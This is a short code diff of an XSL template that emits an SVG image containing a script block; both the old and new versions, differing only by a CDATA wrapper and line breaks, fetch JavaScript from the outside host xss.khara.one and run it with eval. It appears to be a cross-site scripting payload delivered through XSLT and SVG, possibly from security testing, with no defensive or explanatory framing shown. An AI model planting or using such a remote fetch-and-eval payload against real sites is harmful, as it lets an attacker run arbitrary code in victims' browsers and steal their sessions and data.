@@ -15,7 +15,14 @@
 		    </div>
 		</foreignObject>
     <script>
-	    function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://xss.khara.one/a");a.send();
+	<![CDATA[
+	    function b(){
+	    	eval(this.responseText)
+	    };
+	    a=new XMLHttpRequest();
+	    a.addEventListener("load", b);
+	    a.open("GET", "https://xss.khara.one/a");a.send();
+	]]>
     </script>
 	</svg>
  </xsl:template>
